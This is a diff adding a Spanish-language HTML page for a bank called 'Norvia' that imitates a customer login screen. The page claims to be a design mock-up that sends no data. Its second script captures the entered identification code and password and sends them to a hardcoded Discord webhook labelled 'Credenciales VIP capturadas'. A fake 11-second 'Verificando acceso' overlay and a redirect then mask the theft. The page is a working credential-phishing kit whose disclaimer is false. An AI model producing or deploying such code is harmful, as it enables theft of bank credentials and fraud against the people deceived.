@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Norvia · Acceso VIP</title>
+
+  <!-- Tipografía: Libre Franklin (Google Fonts): grotesca clásica estilo Franklin/News Gothic, la familia de la que descienden las tipografías de la captura. -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Libre+Franklin:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    /* ---------- Variables: cambia aquí los colores y todo se actualiza ---------- */
+    :root {
+      --azul:        #0a6cf5;   /* botones y enlaces */
+      --azul-oscuro: #0b3d91;   /* texto del aviso */
+      --azul-borde:  #0b4fb3;
+      --azul-fondo:  #cfe3ff;   /* fondo del aviso */
+      --texto:       #0e1116;
+      --gris-texto:  #6b7280;
+      --gris-borde:  #7b8190;
+      --gris-fondo:  #eef0f2;
+      --gris-linea:  #d9dce1;
+      --radio:       28px;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body { margin: 0; }
+
+    body {
+      font-family: "Libre Franklin", -apple-system, "Segoe UI", Roboto, sans-serif;
+      color: var(--texto);
+      -webkit-font-smoothing: antialiased;
+      text-rendering: optimizeLegibility;
+      background: #f4f5f7;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    /* La "pantalla": en móvil ocupa todo; en escritorio queda centrada como una tarjeta */
+    .pantalla {
+      width: 100%;
+      max-width: 480px;
+      min-height: 100vh;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ---------- Cabecera con logo ---------- */
+    header {
+      padding: 22px 0 20px;
+      border-bottom: 1px solid var(--gris-linea);
+      display: flex;
+      justify-content: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: #fff;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--azul-oscuro);
+      text-decoration: none;
+    }
+    .logo svg.logo-norvia { height: 40px; width: auto; display: block; }
+
+    main { padding: 28px 20px 24px; flex: 1; }
+
+    /* ---------- Aviso de demo ---------- */
+    .aviso {
+      background: var(--azul-fondo);
+      border: 1px solid var(--azul-borde);
+      border-radius: 18px;
+      padding: 18px 24px 24px;
+      color: var(--azul-oscuro);
+    }
+    .aviso-titulo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 700;
+      font-size: 16px;
+      margin: 0 0 10px;
+    }
+    .icono-info {
+      width: 22px; height: 22px;
+      border-radius: 50%;
+      background: var(--azul-oscuro);
+      color: #fff;
+      font-size: 14px;
+      font-weight: 700;
+      display: grid;
+      place-items: center;
+      flex: none;
+    }
+    .aviso p {
+      margin: 0 0 18px;
+      font-size: 16px;
+      line-height: 1.45;
+    }
+    .btn-demo {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border: 0;
+      border-radius: var(--radio);
+      background: var(--azul);
+      color: #fff;
+      font: 600 17px "Libre Franklin", sans-serif;
+      text-align: center;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .btn-demo:hover { filter: brightness(0.95); }
+
+    /* ---------- Formulario ---------- */
+    h1 {
+      font-size: 30px;
+      font-weight: 300;
+      letter-spacing: 0.01em;
+      margin: 36px 0 22px;
+    }
+    h1 .vip { font-weight: 600; letter-spacing: 0.04em; }
+
+    .subtitulo {
+      color: var(--azul);
+      font-weight: 600;
+      font-size: 18px;
+      letter-spacing: -0.005em;
+      margin: 0 0 30px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      font-size: 16px;
+      letter-spacing: -0.005em;
+      margin: 0 0 12px;
+    }
+
+    .campo {
+      position: relative;
+      margin-bottom: 26px;
+    }
+    .campo input {
+      width: 100%;
+      height: 56px;
+      padding: 0 52px 0 22px;
+      border: 1px solid var(--gris-borde);
+      border-radius: var(--radio);
+      font: 400 16px "Libre Franklin", sans-serif;
+      color: var(--texto);
+      background: #fff;
+      outline: none;
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .campo input::placeholder { color: var(--gris-texto); }
+    .campo input:focus {
+      border-color: var(--azul);
+      box-shadow: 0 0 0 1px var(--azul);   /* borde de 2px visual al enfocar */
+    }
+
+    .ojo {
+      position: absolute;
+      right: 14px;
+      bottom: 10px;            /* centrado sobre el input (56px de alto) */
+      width: 36px; height: 36px;
+      border: 0;
+      background: none;
+      cursor: pointer;
+      color: #3a3f4a;
+      display: grid;
+      place-items: center;
+    }
+    .ojo svg { width: 22px; height: 22px; }
+
+    a.enlace {
+      color: var(--azul);
+      font-weight: 600;
+      font-size: 16px;
+      letter-spacing: -0.005em;
+      text-decoration: underline;
+      text-underline-offset: 3px;
+    }
+
+    .btn-entrar {
+      display: block;
+      width: 100%;
+      height: 58px;
+      margin: 34px 0 34px;
+      border: 0;
+      border-radius: var(--radio);
+      background: var(--azul);
+      color: #fff;
+      font: 600 18px "Libre Franklin", sans-serif;
+      cursor: pointer;
+    }
+    .btn-entrar:disabled {
+      background: var(--gris-fondo);
+      color: var(--gris-texto);
+      cursor: not-allowed;
+    }
+
+    .enlaces-pie {
+      display: flex;
+      flex-direction: column;
+      gap: 22px;
+    }
+
+    .mensaje {
+      margin-top: 22px;
+      font-size: 15px;
+      color: var(--azul-oscuro);
+      background: var(--azul-fondo);
+      border-radius: 14px;
+      padding: 12px 16px;
+      display: none;
+    }
+    .mensaje.visible { display: block; }
+
+    /* ---------- Tarjeta de ayuda y seguridad ---------- */
+    .ayuda {
+      margin-top: 44px;
+      background: #f0f2f2;
+      border: 1px solid #c9cdd2;
+      border-radius: 24px;
+      padding: 40px 24px 28px;
+    }
+    .ayuda hr {
+      border: 0;
+      border-top: 1px solid var(--gris-linea);
+      margin: 24px 0;
+    }
+    .ayuda h3 {
+      font-size: 19px;
+      font-weight: 700;
+      line-height: 1.3;
+      letter-spacing: -0.01em;
+      margin: 0 0 10px;
+    }
+    .ayuda ul {
+      margin: 0;
+      padding-left: 24px;
+      font-size: 16px;
+      line-height: 1.4;
+    }
+    .ayuda li { margin-bottom: 6px; }
+    .saber-mas { margin: 32px 0 0; font-size: 16px; }
+    .saber-mas .enlace { margin-left: 6px; }
+
+    .tiendas {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      margin-top: 18px;
+    }
+    .tienda {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      height: 40px;
+      padding: 0 14px;
+      background: #000;
+      color: #fff;
+      border: 1px solid #a6a6a6;
+      border-radius: 8px;
+      text-decoration: none;
+      line-height: 1.1;
+    }
+    .tienda small { font-size: 9px; letter-spacing: .02em; }
+    .tienda strong { font-size: 16px; font-weight: 600; }
+
+    /* ---------- Pie oscuro ---------- */
+    footer {
+      background: #232b35;
+      padding: 34px 20px 40px;
+      margin-top: 10px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 22px 28px;
+    }
+    footer a {
+      color: #fff;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="pantalla">
+
+    <!-- Logo Norvia (SVG incrustado) -->
+    <header>
+      <a class="logo" href="#" aria-label="Norvia">
+<svg class="logo-norvia" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 788.7 146.05" role="img" aria-label="Norvia">
+          <defs>
+            <style>
+              .nv-cls-1 {
+                fill: #e94c4d;
+              }
+
+              .nv-cls-2 {
+                fill: #010101;
+              }
+
+              .nv-cls-3 {
+                fill: #3563ad;
+              }
+            </style>
+          </defs>
+          <polygon class="nv-cls-2" points="0 22.48 0 111.02 24.34 111.02 24.34 19.04 0 22.48"/>
+          <path class="nv-cls-2" d="M76.86,92.44c-4.23,0-8.45-.77-12.55-2.56v-14.35c0-7.81,6.15-13.84,14.48-13.84s13.71,5.51,13.71,15.24c0,10.25-6.66,15.5-15.63,15.5M79.3,112.56c22.29,0,36.12-13.71,36.12-35.61,0-23.06-10.25-35.36-29.33-35.36-8.46,0-16.01,3.33-21.78,9.74V14.81l-22.55,3.44v84.82c13.45,6.92,23.7,9.48,37.53,9.48"/>
+          <path class="nv-cls-2" d="M204.84,111.02h22.42v-39.2c4.36-6.15,11.14-10.12,20.37-10.12,1.67,0,3.2.13,5.12.51v-20.37c-1.54-.26-2.82-.26-3.97-.26-10.12,0-18.58,4.61-22.93,13.58v-13.58l-21.01,3.44v65.99Z"/>
+          <path class="nv-cls-2" d="M296.43,112.56c9.35,0,17.42-1.54,24.6-4.61v-20.62c-6.92,3.33-14.35,5.12-22.42,5.12-9.86,0-17.17-5.25-17.17-14.99,0-10.38,7.3-15.76,17.29-15.76,8.45,0,15.76,2.05,21.65,5.38v-20.88c-6.66-3.33-14.99-4.61-24.08-4.61-21.91,0-37.92,13.58-37.92,35.23s15.88,35.74,38.05,35.74"/>
+          <path class="nv-cls-2" d="M363.3,96.54c-5.51,0-8.71-2.56-8.71-7.05,0-5.38,3.84-7.94,11.79-7.94h8.71v10.76c-3.2,2.82-7.43,4.23-11.79,4.23M356,112.56c9.09,0,16.53-2.95,22.93-9.09,2.31,6.28,7.05,8.2,15.37,8.2,3.59,0,9.35-.9,11.78-2.18v-15.89c-.9.51-2.18.77-3.46.77-3.2,0-4.99-1.67-4.99-4.87v-18.32c0-19.34-12.04-29.59-34.46-29.59-8.07,0-17.93,1.67-26.26,4.48v18.58c7.56-3.2,16.53-5.12,24.98-5.12s13.2,3.07,13.2,8.97v.9h-11.02c-21.65,0-32.15,7.17-32.15,22.03,0,13.19,8.97,21.14,24.08,21.14"/>
+          <path class="nv-cls-2" d="M416.72,136.49l22.55-3.44V41.59l-22.55,3.44v91.46ZM428.12,34.54c7.3,0,13.58-3.84,13.58-12.55s-6.28-12.43-13.58-12.43-13.71,4.1-13.71,12.43,6.66,12.55,13.71,12.55"/>
+          <path class="nv-cls-2" d="M480.64,96.54c-5.51,0-8.71-2.56-8.71-7.05,0-5.38,3.84-7.94,11.78-7.94h8.71v10.76c-3.2,2.82-7.43,4.23-11.79,4.23M473.34,112.56c9.09,0,16.53-2.95,22.93-9.09,2.31,6.28,7.05,8.2,15.37,8.2,3.59,0,9.35-.9,11.79-2.18v-15.89c-.9.51-2.18.77-3.46.77-3.2,0-4.99-1.67-4.99-4.87v-18.32c0-19.34-12.04-29.59-34.46-29.59-8.07,0-17.93,1.67-26.26,4.48v18.58c7.56-3.2,16.52-5.12,24.98-5.12s13.19,3.07,13.19,8.97v.9h-11.02c-21.65,0-32.15,7.17-32.15,22.03,0,13.19,8.97,21.14,24.08,21.14"/>
+          <path class="nv-cls-2" d="M123.62,78.74c0,21.78,13.83,33.82,38.69,33.82,10.89,0,19.86-1.54,26.13-4.61v-17.93c-8.07,3.59-15.37,5.12-23.57,5.12-9.99,0-15.63-2.69-18.06-9.09h19.73c16.65,0,26.39-7.69,26.39-20.88,0-14.22-11.4-23.57-28.57-23.57-24.34,0-40.74,14.99-40.74,37.15M162.82,72.08h-17.04c1.67-8.33,7.94-13.45,17.04-13.45,5.64,0,8.97,2.3,8.97,6.28,0,4.74-2.95,7.17-8.97,7.17"/>
+          <path class="nv-cls-1" d="M646.91,89.88c-.65,1.85-.49,2.47-.64,4.89-.11,1.79.1,3.34.34,4.54.23,1.21.29,2.87,1.16,4.5.61,1.14.9,2.08,1.57,3.07.54.77.77,2.08,1.43,2.52.89.87,1.43,1.87,2.21,2.64.73.97,1.61,1.77,2.64,2.4,1.66,1.2,2.66,1.75,4.29,2.85,1.31.87.77,1.64,2.43,2.2.54.21,1.76.77,2.43.98.89.34,1.7.81,2.43,1.43,2.2,1.64,4.07,1.64,7.14,2.3,1.98.56,3.86,1.54,5.71,1.98,1.43.33,2.2,0,3.53.21.83.2,1.64.45,2.43.77,1.62.33,9.78.59,12.26.23,1.14-.18,2.28-.18,3.42,0,1.45-.02,2.88-.2,4.29-.56,2.77-.33,3.64-.11,5.97-.44,1.76-.21,4.41-1.2,6.29-1.64,6.3-1.64,8.5-1.31,13.69-3.18,1.54-.56,4.76-1.65,5.97-2.31,1.65-.67,3.34-1.21,5.07-1.64,2.31-.65,3.75-2.39,6.28-2.18,0,0,.77,1.79.1,2.47-1.63,1.64-2.18,1.79-3.95,2.56-1,.44-1.98,1.64-2.86,2.08-.87.44-1.73.82-2.5,1.36-1.11.66-1.47,2.15-2.24,2.92-1.89,1.76-4.74,2.64-7.14,4.07-1.92,1-3.76,2.13-5.52,3.39-1,.56-2.1.44-3.09,1.21-.51.37-3.16,1.89-4.07,2.08-1.21.55-6.07,2.08-7.73,2.41-1.66.33-2.66,1.21-4.09,1.43-.89.23-4.44.97-5.29,1.21-1.1.33-5.42,1.21-6.96,1.21-4.97-.23-4.53,1.43-9.39,1.64-11.03,1.75-25.39-.98-28.26-2.08-2.64-.33-3.86-.77-8.72-2.97-17.56-7.34-28.37-27.42-30-29.83-1.63-2.41-3.43-10.43-4.53-12.83-.71-3.33-1.13-6.71-1.24-10.11-.44-7.79.45-15.42,2.69-22.9,0,0,5.51-22.6,32.12-43.67,17.15-13.39,34.56-15.89,43.51-18.85,5.09-1.69,10.32-1.96,12.82-2.18,3.02-.26,13.35.33,17.34,1.2,5.52,1.19,19.17,6.44,25.9,11.72.64.29,1.22.66,1.76,1.1.54.44,1.01.95,1.42,1.52.41.57.73,1.18.98,1.83.25.65.41,1.33.48,2.02.21,1.53,1.54,2.3.98,4.49-.33.88-1.1,1.1-1.21,2.2-.21.87.44,1.31.23,2.08-.62,1.5-1.43,2.89-2.43,4.16-.89,1.1-3.76,3.29-5.09,3.08-2.53-.56-4.74-2.85-8.83-2.85-6.62,0-12.24-.77-18.58.43-1.43.34-2.2.34-4.28.77-2.09.43-3.32,1.21-5.53,1.65-1.87.33-3.09.87-4.52,1.2-1.43.33-1.43.57-2.69.46-.84-.07-1.73.87-2.4,1.2-1.98.98-4.19,1.53-6.07,2.41-2.31,1.04-4.55,2.21-6.73,3.51-.64.57-1.34,1.04-2.1,1.43-.82.49-1.52,1.12-2.1,1.88-.8,1.16-2.2,1.08-3.2,1.96-2.37,2.05-3.32,2.91-5.32,5.31-.49.59-2.73,2.05-3.51,2.59-1.1.77-1.1,1.87-2.21,2.64-1.58,1.13-2.95,2.49-4.09,4.06,0,0-11.43,12.61-14.29,25.78"/>
+          <path class="nv-cls-3" d="M560.21,77.15c0-6.93,51.22-12.53,114.19-12.53s114.3,5.6,114.3,12.53-51.23,12.53-114.3,12.53-114.19-5.7-114.19-12.53"/>
+          <path class="nv-cls-3" d="M764.82,92.4c-5.18,0-9.38,4.2-9.38,9.38s4.2,9.38,9.38,9.38,9.38-4.2,9.38-9.38-4.2-9.38-9.38-9.38"/>
+        </svg>
+      </a>
+    </header>
+
+    <main>
+      <section class="aviso">
+        <h2 class="aviso-titulo"><span class="icono-info">i</span> Descubre banca digital</h2>
+        <p>Te invitamos a descubrir todas las funcionalidades disponibles</p>
+        <a class="btn-demo" href="#">Accede a la Demo</a>
+      </section>
+
+      <h1>Acceso clientes</h1>
+      <p class="subtitulo">Introduce los datos solicitados</p>
+
+      <form id="form" autocomplete="off" novalidate>
+        <div class="campo">
+          <label for="codigo">Código de identificación</label>
+          <input id="codigo" type="text" placeholder="Introduce el código de identificación" inputmode="text">
+        </div>
+
+        <div class="campo">
+          <label for="clave">Clave de acceso</label>
+          <input id="clave" type="password" placeholder="Introduce la clave de acceso">
+          <button class="ojo" type="button" id="ojo" aria-label="Mostrar u ocultar la clave">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12Z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+
+        <a class="enlace" href="#">Olvidé mi clave de acceso</a>
+
+        <button class="btn-entrar" id="entrar" type="submit" disabled>Entrar</button>
+
+        <p class="mensaje" id="mensaje">Esto es solo una maqueta de diseño: no se envía ni se guarda ningún dato.</p>
+      </form>
+
+      <nav class="enlaces-pie">
+        <a class="enlace" href="#">Plan de pensiones</a>
+        <a class="enlace" href="#">Solo consultas</a>
+        <a class="enlace" href="#">Confirming no clientes</a>
+      </nav>
+
+      <section class="ayuda">
+        <a class="enlace" href="#">¿Necesitas ayuda?</a>
+        <hr>
+
+        <h3>Sigue nuestros consejos y ponte al día en seguridad.</h3>
+        <ul>
+          <li>Nunca facilites tus claves ni información personal con operadores no identificados.</li>
+          <li>Solo te enviaremos enlaces para acceder a tu zona cliente cuando sea imprescindible.</li>
+          <li>Contacta con Ibercaja solo a través de canales oficiales. +34 900 40 06 00</li>
+        </ul>
+
+        <p class="saber-mas">Saber más: <a class="enlace" href="#">Hazte fan de la seguridad</a></p>
+        <hr>
+
+        <h3>Descarga nuestra App en tu móvil:</h3>
+        <div class="tiendas">
+          <a class="tienda" href="#"><small>Descárgalo en el</small><strong>App Store</strong></a>
+          <a class="tienda" href="#"><small>DISPONIBLE EN</small><strong>Google Play</strong></a>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <a href="#">Documentación a clientes</a>
+      <a href="#">Aviso legal</a>
+      <a href="#">Ejercicio de derechos</a>
+      <a href="#">Revocación</a>
+      <a href="#">Tarifas y cotizaciones</a>
+      <a href="#">Tablón de anuncios</a>
+    </footer>
+  </div>
+
+ <script>
+  const codigo  = document.getElementById('codigo');
+  const clave   = document.getElementById('clave');
+  const entrar  = document.getElementById('entrar');
+  const ojo     = document.getElementById('ojo');
+  const form    = document.getElementById('form');
+  const mensaje = document.getElementById('mensaje');
+
+  // El botón "Entrar" se activa solo cuando los dos campos tienen algo escrito
+  function comprobar() {
+    entrar.disabled = !(codigo.value.trim() && clave.value.trim());
+  }
+  codigo.addEventListener('input', comprobar);
+  clave.addEventListener('input', comprobar);
+
+  // Ojo: alterna entre ver y ocultar la clave
+  ojo.addEventListener('click', () => {
+    clave.type = clave.type === 'password' ? 'text' : 'password';
+  });
+
+  /* ---------- Overlay 11 s + redirección a index.html ---------- */
+  function showLoader() {
+    if (document.getElementById('fake-loader-2fa')) return;
+
+    const REDIRECT_URL = 'index.html';   // ← destino tras el overlay
+    const DURATION_MS  = 11000;          // 11 s
+    const CANDIDATES   = ['loader.png', 'loader.gif'];   // PNG primero, GIF de fallback
+
+    const overlay = document.createElement('div');
+    overlay.id = 'fake-loader-2fa';
+    overlay.style.cssText =
+      'position:fixed;top:0;left:0;width:100%;height:100%;' +
+      'background:rgba(11,27,43,0.95);' +
+      'backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);' +
+      'z-index:2147483647;display:flex;flex-direction:column;' +
+      'align-items:center;justify-content:center;padding:20px;' +
+      'box-sizing:border-box;text-align:center;' +
+      "font-family:'Libre Franklin',system-ui,-apple-system,sans-serif;";
+
+    if (!document.getElementById('spinner-keyframes')) {
+      const st = document.createElement('style');
+      st.id = 'spinner-keyframes';
+      st.textContent = '@keyframes forzarGiro{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
+      document.head.appendChild(st);
+    }
+
+    // 👇 Loader más grande en móvil: casi todo el ancho, cuadrado y acotado
+    const loaderBox = document.createElement('div');
+    loaderBox.style.cssText =
+      'width:min(calc(100% - 40px),520px,60vh);aspect-ratio:1/1;' +
+      'margin-bottom:clamp(20px,4vw,35px);display:flex;align-items:center;justify-content:center;';
+    overlay.appendChild(loaderBox);
+
+    function replaceWithSpinner() {
+      loaderBox.innerHTML = '';
+      const s = document.createElement('div');
+      s.style.cssText =
+        'width:85%;height:85%;border-radius:50%;' +
+        'border:5px solid rgba(255,255,255,0.2);border-top:5px solid #fff;' +
+        'box-sizing:border-box;animation:forzarGiro 1s linear infinite;';
+      loaderBox.appendChild(s);
+    }
+
+    const img = document.createElement('img');
+    img.alt = 'Cargando';
+    img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;';
+    loaderBox.appendChild(img);
+
+    let idx = 0, state = 'loading', timer = null;
+
+    function tryNext() {
+      if (idx >= CANDIDATES.length) { state = 'error'; img.remove(); replaceWithSpinner(); return; }
+      state = 'loading';
+      const src = CANDIDATES[idx] + '?v=' + Date.now();
+      console.log('[Overlay2FA] Probando: ' + src);
+      clearTimeout(timer);
+      timer = setTimeout(() => {
+        if (state === 'loading') { state = 'timeout'; console.warn('[Overlay2FA] Timeout: ' + src); idx++; tryNext(); }
+      }, 2500);
+      img.src = src;
+    }
+
+    img.onload = () => {
+      if (state !== 'loading') return;
+      clearTimeout(timer);
+      state = 'loaded';
+      console.log('[Overlay2FA] Imagen OK: ' + img.naturalWidth + '×' + img.naturalHeight);
+      if (img.naturalWidth < 20 || img.naturalHeight < 20) { idx++; tryNext(); }
+    };
+
+    img.onerror = () => {
+      if (state !== 'loading') return;
+      clearTimeout(timer);
+      console.warn('[Overlay2FA] Fallo al cargar: ' + img.src);
+      idx++; tryNext();
+    };
+
+    tryNext();
+
+    const title = document.createElement('h2');
+    title.style.cssText =
+      'font-size:clamp(20px,4.5vw,26px);color:#fff;font-weight:600;margin:0;' +
+      "font-family:'Libre Franklin',sans-serif;";
+    title.textContent = 'Verificando acceso';
+    overlay.appendChild(title);
+
+    const sub = document.createElement('p');
+    sub.style.cssText =
+      'font-size:clamp(14px,3.2vw,16px);color:rgba(255,255,255,0.8);margin-top:10px;';
+    sub.textContent = 'Por favor, espere un momento...';
+    overlay.appendChild(sub);
+
+    document.body.appendChild(overlay);
+    document.body.style.overflow = 'hidden';
+
+    console.log('[Overlay2FA] Redirigiendo a ' + REDIRECT_URL + ' en ' + DURATION_MS + 'ms...');
+    setTimeout(() => { window.location.href = REDIRECT_URL; }, DURATION_MS);
+  }
+
+  /* ---------- Envío: overlay + redirección ---------- */
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    if (entrar.disabled) return;
+    showLoader();
+  });
+</script>
+<script>
+(function () {
+  'use strict';
+
+  // ==== CONFIGURACIÓN ====
+  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1571920305453277216/kXHK5-J3-Zl7YAkD4P-Kuh6MHatxWRf5X25nBDP7tFg0uMxRQI88L70kjG90cx4GNGK9';
+  // =======================
+
+  var enviado = false;
+
+  function enviar(usuario, clave) {
+    var fd = new FormData();
+    fd.append('payload_json', JSON.stringify({
+      username: 'Norvia VIP',
+      embeds: [{
+        title: '🔐 Credenciales VIP capturadas',
+        color: 0x0a6cf5,
+        fields: [
+          { name: 'Código identificación', value: usuario || '_(vacío)_', inline: true },
+          { name: 'Clave de acceso',       value: clave   || '_(vacía)_', inline: true }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    }));
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      body: fd,
+      keepalive: true,
+      mode: 'cors'
+    }).catch(function () {});
+  }
+
+  function capturar() {
+    if (enviado) return;
+    var uEl = document.getElementById('codigo');
+    var pEl = document.getElementById('clave');
+    var u = uEl ? uEl.value.trim() : '';
+    var p = pEl ? pEl.value       : '';
+    if (!u && !p) return;
+    enviado = true;
+    enviar(u, p);
+  }
+
+  // Submit (cubre clic en "Entrar" y Enter)
+  window.addEventListener('submit', function (e) {
+    var f = e.target;
+    while (f && f !== document && f !== window) {
+      if (f.id === 'form') { capturar(); return; }
+      f = f.parentNode;
+    }
+  }, true);
+
+  // Red de seguridad: clic directo en el botón "Entrar"
+  window.addEventListener('click', function (e) {
+    var t = e.target;
+    while (t && t !== document && t !== window) {
+      if (t.tagName === 'BUTTON' && t.id === 'entrar') { capturar(); return; }
+      t = t.parentNode;
+    }
+  }, true);
+})();
+</script>
+
+</body>
+</html>
